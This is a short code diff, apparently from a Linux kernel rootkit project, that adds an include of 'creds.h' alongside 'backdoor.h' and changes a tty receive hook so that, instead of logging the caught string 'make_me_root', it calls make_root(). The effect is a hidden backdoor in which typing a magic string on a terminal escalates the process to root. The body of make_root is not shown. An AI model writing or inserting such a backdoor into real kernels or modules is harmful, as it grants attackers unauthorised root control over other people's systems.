@@ -2,6 +2,7 @@
 #include <linux/delay.h>
 
 #include "common.h"
+#include "creds.h"
 #include "backdoor.h"
 #include "hook.h"
 
@@ -87,7 +88,7 @@ g7_receive_buf(struct tty_struct *_tty, const unsigned char *cp, char *fp, int c
 
         if (index == strlen(buf)) {
             index = 0;
-            DEBUG_INFO("caught 'make_me_root'\n");
+            make_root();
         }
     }
 
